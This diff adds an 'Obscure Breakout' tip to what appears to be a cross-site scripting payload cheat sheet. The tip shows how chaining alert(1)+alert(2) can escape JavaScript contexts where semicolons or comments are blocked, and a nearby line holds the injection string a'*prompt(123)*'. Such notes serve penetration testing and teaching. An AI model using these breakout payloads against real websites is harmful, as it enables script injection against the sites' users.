@@ -70,6 +70,14 @@ Don't forget %0D%0A if you need a new line and it renders as a new line
 
 Obscure Breakout
 ==============
+If you copy the two alerts and paste into the Console of the web browser, execute and get NaN
+```html
+EXTREMELY Useful if you can't use ; or // to escape your function calls. You may have to
+reconstruct your functions using ') or matching the total number of parameters and you may have to
+clean up the end by calling the function again and passing useless data, but you javascript has to be correct.
+alert(1)+alert(2)
+NaN
+```
 ```html
 a'*prompt(123)*'
 <script>
